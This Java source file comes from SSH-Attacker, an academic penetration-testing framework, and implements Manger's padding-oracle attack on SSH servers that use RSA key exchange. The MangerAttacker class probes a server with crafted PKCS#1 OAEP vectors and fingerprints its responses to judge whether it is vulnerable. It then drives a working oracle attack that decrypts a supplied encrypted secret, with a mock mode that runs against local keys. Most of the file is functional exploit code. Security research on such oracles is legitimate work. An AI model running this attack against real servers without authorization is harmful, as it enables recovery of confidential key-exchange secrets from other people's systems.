/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.impl;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.KeyFetcher;
import de.rub.nds.sshattacker.attacks.ParallelExecutor;
import de.rub.nds.sshattacker.attacks.config.MangerCommandConfig;
import de.rub.nds.sshattacker.attacks.exception.AttackFailedException;
import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
import de.rub.nds.sshattacker.attacks.general.Vector;
import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
import de.rub.nds.sshattacker.attacks.pkcs1.*;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.MockOracle;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.sshattacker.attacks.pkcs1.util.OaepConverter;
import de.rub.nds.sshattacker.attacks.response.EqualityError;
import de.rub.nds.sshattacker.attacks.response.EqualityErrorTranslator;
import de.rub.nds.sshattacker.attacks.response.FingerPrintChecker;
import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
import de.rub.nds.sshattacker.attacks.task.FingerPrintTask;
import de.rub.nds.sshattacker.attacks.task.SshTask;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.Bits;
import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import de.rub.nds.sshattacker.core.state.State;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.io.pem.PemReader;

import javax.crypto.NoSuchPaddingException;
import java.io.FileReader;
import java.io.IOException;
import java.io.Reader;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

/**
 * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
 * responses. In case there are differences in the server responses, it is very likely that it is
 * possible to execute Manger's attack.
 */
public class MangerAttacker extends Attacker<MangerCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config sshConfig;

    private boolean increasingTimeout = true;

    private long additionalTimeout = 1000;

    private long additionalTcpTimeout = 5000;

    private List<VectorResponse> fullResponseMap;

    private EqualityError resultError;

    private final ParallelExecutor executor;

    private boolean erroneousScans = false;

    private KeyExchangeAlgorithm keyExchangeAlgorithm;

    /**
     * @param mangerConfig Manger attack config
     * @param baseConfig Base config
     */
    public MangerAttacker(MangerCommandConfig mangerConfig, Config baseConfig) {
        super(mangerConfig, baseConfig);
        sshConfig = getSshConfig();
        setKeyExchangeAlgorithm();
        executor = new ParallelExecutor(1, 3);
    }

    /**
     * @param mangerConfig Manger attack config
     * @param baseConfig Base config
     * @param executor Executor
     */
    public MangerAttacker(
            MangerCommandConfig mangerConfig, Config baseConfig, ParallelExecutor executor) {
        super(mangerConfig, baseConfig);
        sshConfig = getSshConfig();
        setKeyExchangeAlgorithm();
        this.executor = executor;
    }

    private void setKeyExchangeAlgorithm() {
        if (config.getKexAlgorithm() == null) {
            throw new ConfigurationException("The key exchange algorithm must be set.");
        } else {
            if (config.getKexAlgorithm().equals("rsa2048_sha256")) {
                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA2048_SHA256;

            } else if (config.getKexAlgorithm().equals("rsa1024_sha1")) {
                keyExchangeAlgorithm = KeyExchangeAlgorithm.RSA1024_SHA1;
            } else {
                throw new ConfigurationException(
                        "Unknown key exchange algorithm, did you mistype it? "
                                + "Options are rsa2048_sha256 and rsa1024_sha1");
            }
        }

        // Set only supported key exchange algorithm to the one specified by the user
        sshConfig.setClientSupportedKeyExchangeAlgorithms(
                new ArrayList<>(Collections.singleton(keyExchangeAlgorithm)));

        CONSOLE.info("Set key exchange algorithm to: " + keyExchangeAlgorithm);
    }

    /** @return If the server is vulnerable to Manger's attack or not */
    @Override
    public Boolean isVulnerable() {
        CONSOLE.info(
                "A server is considered vulnerable to this attack if it reuses it's host key and "
                        + "responds differently to the test vectors.");
        CONSOLE.info(
                "A server is considered secure if it does not reuse the host key or"
                        + " reuses it but always responds in the same way.");

        if (!isTransientKeyReused()) {
            CONSOLE.info("Server does not reuse the host key, it should be safe.");
            return false;
        }

        EqualityError referenceError;
        fullResponseMap = new LinkedList<>();
        try {
            for (int i = 0; i < config.getNumberOfIterations(); i++) {
                List<VectorResponse> responseMap = createVectorResponseList();
                this.fullResponseMap.addAll(responseMap);
            }
        } catch (AttackFailedException e) {
            CONSOLE.info(e.getMessage());
            return null;
        }
        referenceError = getEqualityError(fullResponseMap);
        if (referenceError != EqualityError.NONE) {
            CONSOLE.info(
                    "Found a behavior difference within the responses. The server could be vulnerable.");
        } else {
            CONSOLE.info(
                    "Found no behavior difference within the responses. The server is very likely not vulnerable.");
        }

        CONSOLE.info(EqualityErrorTranslator.translation(referenceError));
        if (referenceError != EqualityError.NONE
                || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
            LOGGER.debug("-------------(Not Grouped)-----------------");
            for (VectorResponse vectorResponse : fullResponseMap) {
                LOGGER.debug(vectorResponse.toString());
            }
        }

        resultError = referenceError;
        return referenceError != EqualityError.NONE;
    }

    /** @return Response vector list */
    public List<VectorResponse> createVectorResponseList() {
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        }

        List<SshTask> taskList = new LinkedList<>();
        List<FingerprintTaskVectorPair<?>> stateVectorPairList = new LinkedList<>();

        for (Pkcs1Vector vector :
                Pkcs1VectorGenerator.generatePkcs1Vectors(
                        publicKey, getHashLength(), getHashInstance())) {

            State state =
                    new State(
                            sshConfig,
                            MangerWorkflowGenerator.generateWorkflow(
                                    sshConfig, vector.getEncryptedValue()));

            FingerPrintTask fingerPrintTask =
                    new FingerPrintTask(
                            state,
                            additionalTimeout,
                            increasingTimeout,
                            executor.getReexecutions(),
                            additionalTcpTimeout);

            taskList.add(fingerPrintTask);
            stateVectorPairList.add(new FingerprintTaskVectorPair<>(fingerPrintTask, vector));
        }
        List<VectorResponse> tempResponseVectorList = new LinkedList<>();
        executor.bulkExecuteTasks(taskList);
        for (FingerprintTaskVectorPair<?> pair : stateVectorPairList) {
            ResponseFingerprint fingerprint;
            if (pair.getFingerPrintTask().isHasError()) {
                erroneousScans = true;
                LOGGER.warn("Could not extract fingerprint for " + pair);
            } else {
                fingerprint = pair.getFingerPrintTask().getFingerprint();
                tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
            }
        }
        return tempResponseVectorList;
    }

    /**
     * This assumes that the responseVectorList only contains comparable vectors
     *
     * @param responseVectorList Response vectors
     * @return Type of EqualityError or EqualityError.NONE if there was none
     */
    public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {

        for (VectorResponse responseOne : responseVectorList) {
            for (VectorResponse responseTwo : responseVectorList) {
                if (responseOne == responseTwo) {
                    continue;
                }
                EqualityError error =
                        FingerPrintChecker.checkEquality(
                                responseOne.getFingerprint(), responseTwo.getFingerprint());
                if (error != EqualityError.NONE) {
                    CONSOLE.info("Found an EqualityError: " + error);
                    LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
                    LOGGER.debug("Fingerprint2: " + responseTwo.getFingerprint().toString());
                    return error;
                }
            }
        }
        return EqualityError.NONE;
    }

    /**
     * Fetches the transient public key from a key exchange. It may not be static.
     *
     * @return Transient public key
     */
    public RSAPublicKey getServerPublicKey() {
        RSAPublicKey publicKey = KeyFetcher.fetchRsaTransientKey(sshConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info(
                String.format(
                        "Fetched server public key with exponent %s and modulus: %s",
                        publicKey.getPublicExponent().toString(16),
                        publicKey.getModulus().toString(16)));
        return publicKey;
    }

    public boolean isTransientKeyReused() {
        RSAPublicKey transientKey1 = getServerPublicKey();
        RSAPublicKey transientKey2 = getServerPublicKey();

        if (transientKey1 == null || transientKey2 == null) {
            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
            throw new OracleUnstableException("Fatal Extraction error");
        } else {
            return transientKey1.getPublicExponent().equals(transientKey2.getPublicExponent())
                    && transientKey1.getModulus().equals(transientKey2.getModulus());
        }
    }

    @Override
    public void executeAttack() {

        if (config.isMockAttack()) {
            mockAttack();
            return;
        }

        if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to Manger's attack");
            return;
        }
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        if (config.getEncryptedSecret() == null) {
            throw new ConfigurationException("The encrypted secret must be set to be decrypted.");
        }

        if (config.getKexAlgorithm() == null) {
            throw new ConfigurationException("The key exchange algorithm must be set.");
        }

        LOGGER.info(
                String.format(
                        "Fetched server public key with exponent %s and modulus: %s",
                        publicKey.getPublicExponent().toString(16),
                        publicKey.getModulus().toString(16)));
        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
        if ((encryptedSecret.length * Bits.IN_A_BYTE) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException(
                    "The length of the encrypted secret "
                            + "is not equal to the public key length. Have you selected the correct value?");
        }
        RealDirectMessagePkcs1Oracle oracle =
                new RealDirectMessagePkcs1Oracle(
                        publicKey, getSshConfig(), extractValidFingerprint(publicKey), null);
        Manger attacker = new Manger(encryptedSecret, oracle);
        attacker.attack();
        BigInteger solution = attacker.getSolution();
        BigInteger secret =
                decodeSolution(
                        solution,
                        ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
                                / Bits.IN_A_BYTE);

        CONSOLE.info("Encoded Solution: " + solution);
        CONSOLE.info("Decoded Secret: " + secret);
    }

    private void mockAttack() {
        RSAPrivateKey privateKey;
        RSAPublicKey publicKey;
        MockOracle oracle;
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        try {
            // Read private key file and create key factory
            String privateKeyFileName = config.getMockKeyFileName();
            Reader fileReader =
                    new FileReader(
                            Objects.requireNonNull(loader.getResource(privateKeyFileName))
                                    .getFile());
            PemReader reader = new PemReader(fileReader);
            byte[] content = reader.readPemObject().getContent();
            KeyFactory factory = KeyFactory.getInstance("RSA");

            // Create private key from file
            PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(content);
            privateKey = (RSAPrivateKey) factory.generatePrivate(privateKeySpec);

            // Read public key
            String publicKeyFileName = config.getMockKeyFileName() + ".pub";
            Reader pubFileReader =
                    new FileReader(
                            Objects.requireNonNull(loader.getResource(publicKeyFileName))
                                    .getFile());
            PemReader pubReader = new PemReader(pubFileReader);
            byte[] pubContent = pubReader.readPemObject().getContent();

            // Create public key from file
            X509EncodedKeySpec pubKeySpec = new X509EncodedKeySpec(pubContent);
            publicKey = (RSAPublicKey) factory.generatePublic(pubKeySpec);

            oracle = new MockOracle(publicKey, privateKey);
        } catch (IOException
                | NoSuchAlgorithmException
                | InvalidKeySpecException
                | NoSuchPaddingException
                | InvalidKeyException e) {
            throw new OracleException("Could not initialize Mock Oracle", e);
        }

        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
        Manger attacker = new Manger(encryptedSecret, oracle);
        attacker.attack();
        BigInteger solution = attacker.getSolution();

        BigInteger secret =
                decodeSolution(
                        solution,
                        ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
                                / Bits.IN_A_BYTE);

        CONSOLE.info("Encoded Solution: " + solution);
        CONSOLE.info("Decoded Secret: " + secret);
    }

    private BigInteger decodeSolution(BigInteger solution, int publicKeyByteLength) {
        try {
            // Decode solution
            byte[] solutionBytes = solution.toByteArray();

            byte[] result =
                    OaepConverter.doOaepDecoding(
                            solutionBytes, getHashInstance(), publicKeyByteLength);

            CONSOLE.debug("Secret with length field as byte array: " + Arrays.toString(result));
            CONSOLE.debug("Secret with length field: " + new BigInteger(result));

            // Cut off length field to get secret as decimal number
            ByteBuffer secretBuffer = ByteBuffer.wrap(result);
            secretBuffer.position(4);
            byte[] secretBytes = new byte[result.length - 4];
            secretBuffer.get(secretBytes);
            return new BigInteger(secretBytes);
        } catch (NoSuchAlgorithmException e) {
            CONSOLE.error("Could not decode solution.", e);
            return BigInteger.ZERO;
        }
    }

    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
        Pkcs1Vector vector =
                Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(
                        publicKey, getHashLength(), getHashInstance());
        State state =
                new State(
                        sshConfig,
                        MangerWorkflowGenerator.generateWorkflow(
                                sshConfig, vector.getEncryptedValue()));
        FingerPrintTask fingerPrintTask =
                new FingerPrintTask(
                        state,
                        additionalTimeout,
                        increasingTimeout,
                        executor.getReexecutions(),
                        additionalTcpTimeout);
        FingerprintTaskVectorPair<? extends Vector> stateVectorPair =
                new FingerprintTaskVectorPair<>(fingerPrintTask, vector);

        executor.bulkExecuteTasks(fingerPrintTask);
        ResponseFingerprint fingerprint = null;
        if (stateVectorPair.getFingerPrintTask().isHasError()) {
            LOGGER.warn("Could not extract fingerprint for " + stateVectorPair);
        } else {
            fingerprint = fingerPrintTask.getFingerprint();
        }
        return fingerprint;
    }

    public EqualityError getResultError() {
        return resultError;
    }

    public List<VectorResponse> getResponseMapList() {
        return fullResponseMap;
    }

    public boolean isErrornousScans() {
        return erroneousScans;
    }

    public boolean isIncreasingTimeout() {
        return increasingTimeout;
    }

    public void setIncreasingTimeout(boolean increasingTimeout) {
        this.increasingTimeout = increasingTimeout;
    }

    public long getAdditionalTimeout() {
        return additionalTimeout;
    }

    public void setAdditionalTimeout(long additionalTimeout) {
        this.additionalTimeout = additionalTimeout;
    }

    public long getAdditionalTcpTimeout() {
        return additionalTcpTimeout;
    }

    public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
        this.additionalTcpTimeout = additionalTcpTimeout;
    }

    private int getHashLength() {
        switch (keyExchangeAlgorithm) {
            case RSA2048_SHA256:
                return 256;
            case RSA1024_SHA1:
                return 160;
            default:
                return 0;
        }
    }

    private String getHashInstance() {
        switch (keyExchangeAlgorithm) {
            case RSA2048_SHA256:
                return "SHA-256";
            case RSA1024_SHA1:
                return "SHA-1";
            default:
                return "";
        }
    }
}
